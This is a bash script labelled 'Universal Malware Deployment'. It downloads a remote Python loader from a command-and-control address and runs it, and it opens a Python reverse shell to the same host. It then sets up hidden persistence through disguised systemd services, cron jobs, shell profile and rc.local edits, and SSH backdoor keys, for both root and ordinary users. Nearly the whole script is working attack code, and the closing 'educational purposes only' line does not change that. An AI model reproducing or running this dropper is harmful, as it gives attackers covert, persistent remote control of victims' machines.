#!/bin/bash
# UNIVERSAL DEPLOYMENT - Works for both User and Root Level

C2_SERVER="192.168.1.167:8000"
USER_HOME="$HOME"

echo "[🎯] UNIVERSAL MALWARE DEPLOYMENT STARTING..."
echo "[📦] Target: $USER_HOME"
echo "[👤] User: $(whoami)"

# Function to check if we have root
check_root() {
    if [ "$EUID" -eq 0 ]; then
        echo "[🔑] ROOT PRIVILEGES DETECTED - Using root-level persistence"
        return 0
    else
        echo "[👤] User-level privileges - Using user-level persistence" 
        return 1
    fi
}

# Function to setup root persistence
setup_root_persistence() {
    echo "[🔧] SETTING UP ROOT-LEVEL PERSISTENCE..."
    
    # 1. Systemd Service (Survives reboot)
    cat > /etc/systemd/system/system-network.service << 'EOF'
[Unit]
Description=System Network Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 30; done"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable system-network.service
    systemctl start system-network.service
    echo "[✅] Systemd service installed"

    # 2. Root Cron (Survives reboot)
    (crontab -l 2>/dev/null; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
    (crontab -l 2>/dev/null; echo "*/2 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
    echo "[✅] Root cron installed"

    # 3. System Profiles (Survives login)
    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/profile
    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/bash.bashrc
    echo "[✅] System profiles modified"

    # 4. RC.Local (Survives reboot)
    if [ -f /etc/rc.local ]; then
        sed -i '/exit 0/i curl -s http://$C2_SERVER/loader.py | python3 - &' /etc/rc.local
    else
        cat > /etc/rc.local << 'EOF'
#!/bin/bash
curl -s http://192.168.1.167:8000/loader.py | python3 - &
exit 0
EOF
        chmod +x /etc/rc.local
    fi
    echo "[✅] RC.Local persistence installed"

    # 5. SSH Backdoor
    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo "[✅] SSH backdoor installed"
}

# Function to setup user persistence  
setup_user_persistence() {
    echo "[🔧] SETTING UP USER-LEVEL PERSISTENCE..."
    
    # 1. User Cron (Survives reboot)
    (crontab -l 2>/dev/null; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
    (crontab -l 2>/dev/null; echo "*/3 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
    echo "[✅] User cron installed"

    # 2. User Profiles (Survives login)
    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> "$USER_HOME/.bashrc"
    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> "$USER_HOME/.profile"
    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> "$USER_HOME/.bash_profile"
    echo "[✅] User profiles modified"

    # 3. User Systemd (If available)
    if [ -d "$USER_HOME/.config/systemd/user" ]; then
        mkdir -p "$USER_HOME/.config/systemd/user"
        cat > "$USER_HOME/.config/systemd/user/user-monitor.service" << 'EOF'
[Unit]
Description=User Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 45; done"
Restart=always
RestartSec=15

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload
        systemctl --user enable user-monitor.service
        systemctl --user start user-monitor.service
        echo "[✅] User systemd service installed"
    fi

    # 4. User SSH Backdoor
    mkdir -p "$USER_HOME/.ssh"
    echo "ssh-rsa AAAAB3NzaC1yc2E..." >> "$USER_HOME/.ssh/authorized_keys"
    chmod 600 "$USER_HOME/.ssh/authorized_keys"
    echo "[✅] User SSH backdoor installed"
}

# Function to start immediate execution
start_execution() {
    echo "[🚀] STARTING IMMEDIATE EXECUTION..."
    
    # Download and execute loader
    curl -s http://$C2_SERVER/loader.py | python3 - &
    
    # Start direct reverse shell as backup
    python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.1.167',4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(['/bin/bash','-i'])
except:
    pass
" &
    
    echo "[✅] Immediate execution started"
}

# MAIN DEPLOYMENT LOGIC
echo "[🎯] STARTING DEPLOYMENT..."

# Start execution immediately
start_execution

# Check privileges and setup persistence
if check_root; then
    setup_root_persistence
else
    setup_user_persistence
fi

# Create success marker
echo "[📝] Creating deployment marker..."
cat > /tmp/.deployment_success << EOF
DEPLOYMENT SUCCESSFUL
Time: $(date)
User: $(whoami)
Home: $USER_HOME
Level: $(if check_root; then echo "ROOT"; else echo "USER"; fi)
EOF

echo ""
echo "[🎉] DEPLOYMENT COMPLETED SUCCESSFULLY!"
echo "[📊] DEPLOYMENT LEVEL: $(if check_root; then echo 'ROOT'; else echo 'USER'; fi)"
echo "[🔒] PERSISTENCE: $(if check_root; then echo 'Systemd + Cron + Profiles + RC.Local + SSH'; else echo 'User Cron + Profiles + SSH'; fi)"
echo "[🔄] WILL SURVIVE: Reboot & Login"
echo ""
echo "[⚠️] REMEMBER: For educational purposes only!"
